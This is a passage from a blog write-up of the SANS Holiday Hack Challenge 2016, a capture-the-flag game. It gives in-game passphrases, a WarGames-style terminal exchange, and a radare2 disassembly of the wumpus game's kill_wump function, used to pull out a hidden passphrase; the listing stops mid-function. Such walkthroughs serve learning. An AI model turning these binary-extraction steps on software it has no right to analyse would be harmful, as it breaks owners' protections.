characters in the path, and tabulation autocomplete is disabled on this
terminal. However, we can use some shell-fu to get the content of the file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;find ~/.doormat -name &lt;span class="s2"&gt;&amp;quot;key_for_the_door.txt&amp;quot;&lt;/span&gt; -exec cat &lt;span class="o"&gt;{}&lt;/span&gt; &lt;span class="se"&gt;\;&lt;/span&gt;
key: open_sesame
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Passphrase: &lt;code&gt;open_sesame&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;With this passphrase, we can open the door, which gives us access to Santa's
office.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="santa-s-office"&gt;
&lt;h3&gt;Santa's office&lt;/h3&gt;
&lt;p&gt;When you interact with the terminal in Santa's office, you get greeted by this
prompt:&lt;/p&gt;
&lt;img alt="santa_office_wargames.png" class="align-center" src="/images/sans-christmas-challenge-2016/santa_office_wargames.png" /&gt;
&lt;p&gt;By &lt;a class="reference external" href="https://duckduckgo.com/?q=greetings+professor+falken"&gt;DuckDuckGoing&lt;/a&gt;
this sentence, we can find that it's a &lt;a class="reference external" href="https://en.wikipedia.org/wiki/WarGames"&gt;WarGames&lt;/a&gt;
reference. Now, I haven't seen WarGames (I know, shame on me), but I managed to
find &lt;a class="reference external" href="https://www.youtube.com/watch?v=KXzNo0vR_dU"&gt;a clip&lt;/a&gt; with the
necessary commands:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;    GREETINGS PROFESSOR FALKEN.

&lt;span class="hll"&gt;    Hello.
&lt;/span&gt;
    HOW ARE YOU FEELING TODAY?

&lt;span class="hll"&gt;    I&amp;#39;m fine. How are you?
&lt;/span&gt;
    EXCELLENT, IT&amp;#39;S BEEN A LONG TIME. CAN YOU EXPLAIN THE REMOVAL OF YOUR USER ACCOUNT ON 6
    /23/73?

&lt;span class="hll"&gt;    People sometimes make mistakes.
&lt;/span&gt;
    YES THEY DO. SHALL WE PLAY A GAME?

&lt;span class="hll"&gt;    Love to. How about Global Thermonuclear War?
&lt;/span&gt;
    WOULDN&amp;#39;T YOU PREFER A GOOD GAME OF CHESS?

&lt;span class="hll"&gt;    Later. Let&amp;#39;s play Global Thermonuclear War.
&lt;/span&gt;
    FINE

    ,------~~v,_         _                     _--^\
     |&amp;#39;          \   ,__/ ||                 _/    /,_ _
    /             \,/     /         ,,  _,,/^         v v-___
    |                    /          |&amp;#39;~^                     \
    \                   |         _/                     _ _/^
     \                 /         /                   ,~~^/ |
      ^~~_       _ _   /          |          __,, _v__\   \/
          &amp;#39;~~,  , ~ \ \           ^~       /    ~   //
              \/     \/             \~,  ,/
                                       ~~
       UNITED STATES                   SOVIET UNION
    WHICH SIDE DO YOU WANT?
         1.    UNITED STATES
         2.    SOVIET UNION
    PLEASE CHOOSE ONE:
&lt;span class="hll"&gt;    2
&lt;/span&gt;
    AWAITING FIRST STRIKE COMMAND
    -----------------------------
    PLEASE LIST PRIMARY TARGETS BY
CITY AND/OR COUNTRY NAME:

&lt;span class="hll"&gt;Las Vegas
&lt;/span&gt;
LAUNCH INITIATED, HERE&amp;#39;S THE KEY FOR YOUR TROUBLE:
LOOK AT THE PRETTY LIGHTS
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Passphrase: &lt;code&gt;LOOK AT THE PRETTY LIGHTS&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;With this passphrase, you can access a new room called the corridor.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="the-corridor"&gt;
&lt;h3&gt;The corridor&lt;/h3&gt;
&lt;p&gt;There's no terminal in this room, only a password protected door. Let's put
a pin on this for now.&lt;/p&gt;
&lt;img alt="the_corridor_password_protected.png" class="align-center" src="/images/sans-christmas-challenge-2016/the_corridor_password_protected.png" /&gt;
&lt;/div&gt;
&lt;div class="section" id="workshop-second-door"&gt;
&lt;h3&gt;Workshop, second door&lt;/h3&gt;
&lt;pre class="literal-block"&gt;
*******************************************************************************
*                                                                             *
* Find the passphrase from the wumpus. Play fair or cheat; it's up to you.    *
*                                                                             *
*******************************************************************************
&lt;/pre&gt;
&lt;p&gt;On this terminal, we have a kind of game, looking a lot like &lt;a class="reference external" href="https://en.wikipedia.org/wiki/Hunt_the_Wumpus"&gt;Hunt the Wumpus&lt;/a&gt;, where we have to go
down a dungeon, slay the wumpus, and get the passphrase from it.&lt;/p&gt;
&lt;img alt="wumpus_launch.png" class="align-center" src="/images/sans-christmas-challenge-2016/wumpus_launch.png" /&gt;
&lt;p&gt;However, instead of playing the game, we chan cheat, as the motd suggests, by
analyzing the binary to extract the passphrase. We can extract the
&lt;code&gt;wumpus&lt;/code&gt; binary by base64-encoding it on the board, copying the result,
then base64-decoding it on our analysis machine. You can get a copy of the
executable &lt;a class="reference external" href="/docs/sans-christmas-challenge-2016/wumpus"&gt;here&lt;/a&gt; (sha256:
&lt;code&gt;10412d7773a5d3a49e5a5facdc5aa386a4e3eaec7dca83bc769a104e1790c1fd&lt;/code&gt;).&lt;/p&gt;
&lt;p&gt;If we look at the list of functions we can see one called &lt;code&gt;kill_wump&lt;/code&gt;. By
looking at the disassembly of this function, using radare2 (God, I've got to
learn how to use this tool, there seems to be a steep learning curve!), we can
see that this function is called when you managed to kill the wumpus, and gives
you the passphrase:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;[&lt;/span&gt;0x00605118&lt;span class="o"&gt;]&lt;/span&gt;&amp;gt; pdf @ fcn.kill_wump
/ &lt;span class="o"&gt;(&lt;/span&gt;fcn&lt;span class="o"&gt;)&lt;/span&gt; fcn.kill_wump 546
&lt;span class="p"&gt;|&lt;/span&gt;   fcn.kill_wump &lt;span class="o"&gt;()&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;           &lt;span class="p"&gt;;&lt;/span&gt; var int local_8h @ rbp-0x8
&lt;span class="p"&gt;|&lt;/span&gt;           0x00402644      &lt;span class="m"&gt;55&lt;/span&gt;             push rbp
&lt;span class="p"&gt;|&lt;/span&gt;           0x00402645      4889e5         mov rbp, rsp
&lt;span class="p"&gt;|&lt;/span&gt;           0x00402648      4883ec10       sub rsp, 0x10
&lt;span class="p"&gt;|&lt;/span&gt;           0x0040264c      bf38354000     mov edi, str._thwock____groan___crash__n_nA_horrible_roar_fills_the_cave__and_you_realize__with_a_smile__that_you_nhave_slain_the_evil_Wumpus_and_won_the_game___You_don_t_want_to_tarry_for_nlong__however__because_not_only_is_the_Wumpus_famous__but_the_stench_of_ndead_Wumpus_is_also_quite_well_known__a_stench_plenty_enough_to_slay_the_nmightiest_adventurer_at_a_single_whiff__ &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;*thwock!* *groan* *crash*..A horrible roar fills the cave, and you realize, with a smile, that you.have slain the evil Wumpus and won the game!  You don&amp;#39;t want to tarry for.long, however, because not only is the Wumpus famous, but the stench of.dead Wumpus is also quite well known, a stench plenty enough to slay the.mightiest adventurer at a single whiff!!&amp;quot;&lt;/span&gt; @ 0x403538
&lt;span class="p"&gt;|&lt;/span&gt;           0x00402651      e85ae4ffff     call sym.imp.puts          &lt;span class="p"&gt;;&lt;/span&gt; int puts&lt;span class="o"&gt;(&lt;/span&gt;const char *s&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;           0x00402656      bf18000000     mov edi, 0x18               &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;0.@&amp;quot;&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;           0x0040265b      e8f0e4ffff     call sym.imp.malloc        &lt;span class="p"&gt;;&lt;/span&gt;  void *malloc&lt;span class="o"&gt;(&lt;/span&gt;size_t size&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;           0x00402660      488945f8       mov qword &lt;span class="o"&gt;[&lt;/span&gt;rbp - local_8h&lt;span class="o"&gt;]&lt;/span&gt;, rax
&lt;span class="p"&gt;|&lt;/span&gt;           0x00402664      488b05cd2a20.  mov rax, qword &lt;span class="o"&gt;[&lt;/span&gt;obj.m4&lt;span class="o"&gt;]&lt;/span&gt;     &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;0x605138:8&lt;span class="o"&gt;]=&lt;/span&gt;0x402a08 str.When_you_want_to_know_how_things_really_work__study_them_when_they_re_coming_apart LEA obj.m4 &lt;span class="p"&gt;;&lt;/span&gt; obj.m4
&lt;span class="p"&gt;|&lt;/span&gt;           0x0040266b      0fb65009       movzx edx, byte &lt;span class="o"&gt;[&lt;/span&gt;rax + 9&lt;span class="o"&gt;]&lt;/span&gt;   &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;0x9:1&lt;span class="o"&gt;]=&lt;/span&gt;0
&lt;span class="p"&gt;|&lt;/span&gt;           0x0040266f      488b45f8       mov rax, qword &lt;span class="o"&gt;[&lt;/span&gt;rbp - local_8h&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;           0x00402673      &lt;span class="m"&gt;8810&lt;/span&gt;           mov byte &lt;span class="o"&gt;[&lt;/span&gt;rax&lt;span class="o"&gt;]&lt;/span&gt;, dl
&lt;span class="p"&gt;|&lt;/span&gt;           0x00402675      488b45f8       mov rax, qword &lt;span class="o"&gt;[&lt;/span&gt;rbp - local_8h&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;           0x00402679      488d5001       lea rdx, &lt;span class="o"&gt;[&lt;/span&gt;rax + 1&lt;span class="o"&gt;]&lt;/span&gt;          &lt;span class="p"&gt;;&lt;/span&gt; 0x1
&lt;span class="p"&gt;|&lt;/span&gt;           0x0040267d      488b05bc2a20.  mov rax, qword &lt;span class="o"&gt;[&lt;/span&gt;obj.m5&lt;span class="o"&gt;]&lt;/span&gt;     &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;0x605140:8&lt;span class="o"&gt;]=&lt;/span&gt;0x402a60 str.We_have_no_future_because_our_present_is_too_volatile._We_have_only_risk_management. LEA obj.m5 &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;`*@&amp;quot;&lt;/span&gt; @ 0x605140
&lt;span class="p"&gt;|&lt;/span&gt;           0x00402684      0fb6400e       movzx eax, byte &lt;span class="o"&gt;[&lt;/span&gt;rax + 0xe&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;0xe:1&lt;span class="o"&gt;]=&lt;/span&gt;0
&lt;span class="p"&gt;|&lt;/span&gt;           0x00402688      &lt;span class="m"&gt;8802&lt;/span&gt;           mov byte &lt;span class="o"&gt;[&lt;/span&gt;rdx&lt;span class="o"&gt;]&lt;/span&gt;, al
&lt;span class="p"&gt;|&lt;/span&gt;           0x0040268a      488b45f8       mov rax, qword &lt;span class="o"&gt;[&lt;/span&gt;rbp - local_8h&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;           0x0040268e      488d5002       lea rdx, &lt;span class="o"&gt;[&lt;/span&gt;rax + 2&lt;span class="o"&gt;]&lt;/span&gt;          &lt;span class="p"&gt;;&lt;/span&gt; 0x2
&lt;span class="p"&gt;|&lt;/span&gt;           0x00402692      488b059f2a20.  mov rax, qword &lt;span class="o"&gt;[&lt;/span&gt;obj.m4&lt;span class="o"&gt;]&lt;/span&gt;     &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;0x605138:8&lt;span class="o"&gt;]=&lt;/span&gt;0x402a08 str.When_you_want_to_know_how_things_really_work__study_them_when_they_re_coming_apart LEA obj.m4 &lt;span class="p"&gt;;&lt;/span&gt; obj.m4
&lt;span class="p"&gt;|&lt;/span&gt;           0x00402699      0fb64037       movzx eax, byte &lt;span class="o"&gt;[&lt;/span&gt;rax + 0x37&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;0x37:1&lt;span class="o"&gt;]=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;7&amp;#39;&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;           0x0040269d      &lt;span class="m"&gt;8802&lt;/span&gt;           mov byte &lt;span class="o"&gt;[&lt;/span&gt;rdx&lt;span class="o"&gt;]&lt;/span&gt;, al
&lt;span class="p"&gt;|&lt;/span&gt;           0x0040269f      488b45f8       mov rax, qword &lt;span class="o"&gt;[&lt;/span&gt;rbp - local_8h&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;           0x004026a3      488d5003       lea rdx, &lt;span class="o"&gt;[&lt;/span&gt;rax + 3&lt;span class="o"&gt;]&lt;/span&gt;          &lt;span class="p"&gt;;&lt;/span&gt; 0x3
&lt;span class="p"&gt;|&lt;/span&gt;           0x004026a7      488b05722a20.  mov rax, qword &lt;span class="o"&gt;[&lt;/span&gt;obj.m0&lt;span class="o"&gt;]&lt;/span&gt;     &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;0x605120:8&lt;span class="o"&gt;]=&lt;/span&gt;0x402970 str.The_sky_above_the_port_was_the_color_of_television__tuned_to_a_dead_channel. LEA obj.m0 &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;p)@&amp;quot;&lt;/span&gt; @ 0x605120
&lt;span class="p"&gt;|&lt;/span&gt;           0x004026ae      0fb64012       movzx eax, byte &lt;span class="o"&gt;[&lt;/span&gt;rax + 0x12&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;0x12:1&lt;span class="o"&gt;]=&lt;/span&gt;62
&lt;span class="p"&gt;|&lt;/span&gt;           0x004026b2      &lt;span class="m"&gt;8802&lt;/span&gt;           mov byte &lt;span class="o"&gt;[&lt;/span&gt;rdx&lt;span class="o"&gt;]&lt;/span&gt;, al
&lt;span class="p"&gt;|&lt;/span&gt;           0x004026b4      488b45f8       mov rax, qword &lt;span class="o"&gt;[&lt;/span&gt;rbp - local_8h&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;           0x004026b8      488d5004       lea rdx, &lt;span class="o"&gt;[&lt;/span&gt;rax + 4&lt;span class="o"&gt;]&lt;/span&gt;          &lt;span class="p"&gt;;&lt;/span&gt; 0x4
&lt;span class="p"&gt;|&lt;/span&gt;           0x004026bc      488b05852a20.  mov rax, qword &lt;span class="o"&gt;[&lt;/span&gt;obj.m6&lt;span class="o"&gt;]&lt;/span&gt;     &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;0x605148:8&lt;span class="o"&gt;]=&lt;/span&gt;0x402ab8 str.Stand_high_long_enough_and_your_lightning_will_come. LEA obj.m6 &lt;span class="p"&gt;;&lt;/span&gt; obj.m6
&lt;span class="p"&gt;|&lt;/span&gt;           0x004026c3      0fb6401d       movzx eax, byte &lt;span class="o"&gt;[&lt;/span&gt;rax + 0x1d&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;0x1d:1&lt;span class="o"&gt;]=&lt;/span&gt;0
&lt;span class="p"&gt;|&lt;/span&gt;           0x004026c7      &lt;span class="m"&gt;8802&lt;/span&gt;           mov byte &lt;span class="o"&gt;[&lt;/span&gt;rdx&lt;span class="o"&gt;]&lt;/span&gt;, al
&lt;span class="p"&gt;|&lt;/span&gt;           0x004026c9      488b45f8       mov rax, qword &lt;span class="o"&gt;[&lt;/span&gt;rbp - local_8h&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;           0x004026cd      488d5005       lea rdx, &lt;span class="o"&gt;[&lt;/span&gt;rax + 5&lt;span class="o"&gt;]&lt;/span&gt;          &lt;span class="p"&gt;;&lt;/span&gt; 0x5
&lt;span class="p"&gt;|&lt;/span&gt;           0x004026d1      488b05582a20.  mov rax, qword &lt;span class="o"&gt;[&lt;/span&gt;obj.m2&lt;span class="o"&gt;]&lt;/span&gt;     &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;0x605130:8&lt;span class="o"&gt;]=&lt;/span&gt;0x4029d8 str.The_street_finds_its_own_uses_for_things. LEA obj.m2 &lt;span class="p"&gt;;&lt;/span&gt; obj.m2
&lt;span class="p"&gt;|&lt;/span&gt;           0x004026d8      0fb64004       movzx eax, byte &lt;span class="o"&gt;[&lt;/span&gt;rax + 4&lt;span class="o"&gt;]&lt;/span&gt;   &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;0x4:1&lt;span class="o"&gt;]=&lt;/span&gt;2
&lt;span class="p"&gt;|&lt;/span&gt;           0x004026dc      &lt;span class="m"&gt;8802&lt;/span&gt;           mov byte &lt;span class="o"&gt;[&lt;/span&gt;rdx&lt;span class="o"&gt;]&lt;/span&gt;, al
&lt;span class="p"&gt;|&lt;/span&gt;           0x004026de      488b45f8       mov rax, qword &lt;span class="o"&gt;[&lt;/span&gt;rbp - local_8h&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;           0x004026e2      488d5006       lea rdx, &lt;span class="o"&gt;[&lt;/span&gt;rax + 6&lt;span class="o"&gt;]&lt;/span&gt;          &lt;span class="p"&gt;;&lt;/span&gt; 0x6
&lt;span class="p"&gt;|&lt;/span&gt;           0x004026e6      488b055b2a20.  mov rax, qword &lt;span class="o"&gt;[&lt;/span&gt;obj.m6&lt;span class="o"&gt;]&lt;/span&gt;     &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;0x605148:8&lt;span class="o"&gt;]=&lt;/span&gt;0x402ab8 str.Stand_high_long_enough_and_your_lightning_will_come. LEA obj.m6 &lt;span class="p"&gt;;&lt;/span&gt; obj.m6
&lt;span class="p"&gt;|&lt;/span&gt;           0x004026ed      0fb64016       movzx eax, byte &lt;span class="o"&gt;[&lt;/span&gt;rax + 0x16&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;0x16:1&lt;span class="o"&gt;]=&lt;/span&gt;0
&lt;span class="p"&gt;|&lt;/span&gt;           0x004026f1      &lt;span class="m"&gt;8802&lt;/span&gt;           mov byte &lt;span class="o"&gt;[&lt;/span&gt;rdx&lt;span class="o"&gt;]&lt;/span&gt;, al
&lt;span class="p"&gt;|&lt;/span&gt;           0x004026f3      488b45f8       mov rax, qword &lt;span class="o"&gt;[&lt;/span&gt;rbp - local_8h&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;           0x004026f7      488d5007       lea rdx, &lt;span class="o"&gt;[&lt;/span&gt;rax + 7&lt;span class="o"&gt;]&lt;/span&gt;          &lt;span class="p"&gt;;&lt;/span&gt; 0x7
&lt;span class="p"&gt;|&lt;/span&gt;           0x004026fb      488b05262a20.  mov rax, qword &lt;span class="o"&gt;[&lt;/span&gt;obj.m1&lt;span class="o"&gt;]&lt;/span&gt;     &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;0x605128:8&lt;span class="o"&gt;]=&lt;/span&gt;0x4029bd str.Pattern_Recognition. LEA obj.m1 &lt;span class="p"&gt;;&lt;/span&gt; obj.m1
&lt;span class="p"&gt;|&lt;/span&gt;           0x00402702      0fb6400e       movzx eax, byte &lt;span class="o"&gt;[&lt;/span&gt;rax + 0xe&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;0xe:1&lt;span class="o"&gt;]=&lt;/span&gt;0
&lt;span class="p"&gt;|&lt;/span&gt;           0x00402706      &lt;span class="m"&gt;8802&lt;/span&gt;           mov byte &lt;span class="o"&gt;[&lt;/span&gt;rdx&lt;span class="o"&gt;]&lt;/span&gt;, al
&lt;span class="p"&gt;|&lt;/span&gt;           0x00402708      488b45f8       mov rax, qword &lt;span class="o"&gt;[&lt;/span&gt;rbp - local_8h&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;           0x0040270c      488d5008       lea rdx, &lt;span class="o"&gt;[&lt;/span&gt;rax + 8&lt;span class="o"&gt;]&lt;/span&gt;          &lt;span class="p"&gt;;&lt;/span&gt; 0x8
&lt;span class="p"&gt;|&lt;/span&gt;           0x00402710      488b05212a20.  mov rax, qword &lt;span class="o"&gt;[&lt;/span&gt;obj.m4&lt;span class="o"&gt;]&lt;/span&gt;     &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;0x605138:8&lt;span class="o"&gt;]=&lt;/span&gt;0x402a08 str.When_you_want_to_know_how_things_really_work__study_them_when_they_re_coming_apart LEA obj.m4 &lt;span class="p"&gt;;&lt;/span&gt; obj.m4
&lt;span class="p"&gt;|&lt;/span&gt;           0x00402717      0fb6402e       movzx eax, byte &lt;span class="o"&gt;[&lt;/span&gt;rax + 0x2e&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;0x2e:1&lt;span class="o"&gt;]=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;.&amp;#39;&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;           0x0040271b      &lt;span class="m"&gt;8802&lt;/span&gt;           mov byte &lt;span class="o"&gt;[&lt;/span&gt;rdx&lt;span class="o"&gt;]&lt;/span&gt;, al
&lt;span class="p"&gt;|&lt;/span&gt;           0x0040271d      488b45f8       mov rax, qword &lt;span class="o"&gt;[&lt;/span&gt;rbp - local_8h&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;           0x00402721      488d5009       lea rdx, &lt;span class="o"&gt;[&lt;/span&gt;rax + 9&lt;span class="o"&gt;]&lt;/span&gt;          &lt;span class="p"&gt;;&lt;/span&gt; 0x9
&lt;span class="p"&gt;|&lt;/span&gt;           0x00402725      488b05142a20.  mov rax, qword &lt;span class="o"&gt;[&lt;/span&gt;obj.m5&lt;span class="o"&gt;]&lt;/span&gt;     &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;0x605140:8&lt;span class="o"&gt;]=&lt;/span&gt;0x402a60 str.We_have_no_future_because_our_present_is_too_volatile._We_have_only_risk_management. LEA obj.m5 &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;`*@&amp;quot;&lt;/span&gt; @ 0x605140
&lt;span class="p"&gt;|&lt;/span&gt;           0x0040272c      0fb64007       movzx eax, byte &lt;span class="o"&gt;[&lt;/span&gt;rax + 7&lt;span class="o"&gt;]&lt;/span&gt;   &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;0x7:1&lt;span class="o"&gt;]=&lt;/span&gt;0
&lt;span class="p"&gt;|&lt;/span&gt;           0x00402730      &lt;span class="m"&gt;8802&lt;/span&gt;           mov byte &lt;span class="o"&gt;[&lt;/span&gt;rdx&lt;span class="o"&gt;]&lt;/span&gt;, al
&lt;span class="p"&gt;|&lt;/span&gt;           0x00402732      488b45f8       mov rax, qword &lt;span class="o"&gt;[&lt;/span&gt;rbp - local_8h&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;           0x00402736      488d500a       lea rdx, &lt;span class="o"&gt;[&lt;/span&gt;rax + 0xa&lt;span class="o"&gt;]&lt;/span&gt;        &lt;span class="p"&gt;;&lt;/span&gt; 0xa
&lt;span class="p"&gt;|&lt;/span&gt;           0x0040273a      488b05ff2920.  mov rax, qword &lt;span class="o"&gt;[&lt;/span&gt;obj.m5&lt;span class="o"&gt;]&lt;/span&gt;     &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;0x605140:8&lt;span class="o"&gt;]=&lt;/span&gt;0x402a60 str.We_have_no_future_because_our_present_is_too_volatile._We_have_only_risk_management. LEA obj.m5 &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;`*@&amp;quot;&lt;/span&gt; @ 0x605140
&lt;span class="p"&gt;|&lt;/span&gt;           0x00402741      0fb64049       movzx eax, byte &lt;span class="o"&gt;[&lt;/span&gt;rax + 0x49&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;0x49:1&lt;span class="o"&gt;]=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;I&amp;#39;&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;           0x00402745      &lt;span class="m"&gt;8802&lt;/span&gt;           mov byte &lt;span class="o"&gt;[&lt;/span&gt;rdx&lt;span class="o"&gt;]&lt;/span&gt;, al
&lt;span class="p"&gt;|&lt;/span&gt;           0x00402747      488b45f8       mov rax, qword &lt;span class="o"&gt;[&lt;/span&gt;rbp - local_8h&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;           0x0040274b      488d500b       lea rdx, &lt;span class="o"&gt;[&lt;/span&gt;rax + 0xb&lt;span class="o"&gt;]&lt;/span&gt;        &lt;span class="p"&gt;;&lt;/span&gt; 0xb
&lt;span class="p"&gt;|&lt;/span&gt;           0x0040274f      488b05f22920.  mov rax, qword &lt;span class="o"&gt;[&lt;/span&gt;obj.m6&lt;span class="o"&gt;]&lt;/span&gt;     &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;0x605148:8&lt;span class="o"&gt;]=&lt;/span&gt;0x402ab8 str.Stand_high_long_enough_and_your_lightning_will_come. LEA obj.m6 &lt;span class="p"&gt;;&lt;/span&gt; obj.m6
&lt;span class="p"&gt;|&lt;/span&gt;           0x00402756      0fb64007       movzx eax, byte &lt;span class="o"&gt;[&lt;/span&gt;rax + 7&lt;span class="o"&gt;]&lt;/span&gt;   &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;0x7:1&lt;span class="o"&gt;]=&lt;/span&gt;0
&lt;span class="p"&gt;|&lt;/span&gt;           0x0040275a      &lt;span class="m"&gt;8802&lt;/span&gt;           mov byte &lt;span class="o"&gt;[&lt;/span&gt;rdx&lt;span class="o"&gt;]&lt;/span&gt;, al
&lt;span class="p"&gt;|&lt;/span&gt;           0x0040275c      488b45f8       mov rax, qword &lt;span class="o"&gt;[&lt;/span&gt;rbp - local_8h&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;           0x00402760      488d500c       lea rdx, &lt;span class="o"&gt;[&lt;/span&gt;rax + 0xc&lt;span class="o"&gt;]&lt;/span&gt;        &lt;span class="p"&gt;;&lt;/span&gt; 0xc
&lt;span class="p"&gt;|&lt;/span&gt;           0x00402764      488b05c52920.  mov rax, qword &lt;span class="o"&gt;[&lt;/span&gt;obj.m2&lt;span class="o"&gt;]&lt;/span&gt;     &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;0x605130:8&lt;span class="o"&gt;]=&lt;/span&gt;0x4029d8 str.The_street_finds_its_own_uses_for_things. LEA obj.m2 &lt;span class="p"&gt;;&lt;/span&gt; obj.m2
&lt;span class="p"&gt;|&lt;/span&gt;           0x0040276b      0fb64004       movzx eax, byte &lt;span class="o"&gt;[&lt;/span&gt;rax + 4&lt;span class="o"&gt;]&lt;/span&gt;   &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;0x4:1&lt;span class="o"&gt;]=&lt;/span&gt;2
&lt;span class="p"&gt;|&lt;/span&gt;           0x0040276f      &lt;span class="m"&gt;8802&lt;/span&gt;           mov byte &lt;span class="o"&gt;[&lt;/span&gt;rdx&lt;span class="o"&gt;]&lt;/span&gt;, al
&lt;span class="p"&gt;|&lt;/span&gt;           0x00402771      488b45f8       mov rax, qword &lt;span class="o"&gt;[&lt;/span&gt;rbp - local_8h&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;           0x00402775      488d500d       lea rdx, &lt;span class="o"&gt;[&lt;/span&gt;rax + 0xd&lt;span class="o"&gt;]&lt;/span&gt;        &lt;span class="p"&gt;;&lt;/span&gt; 0xd
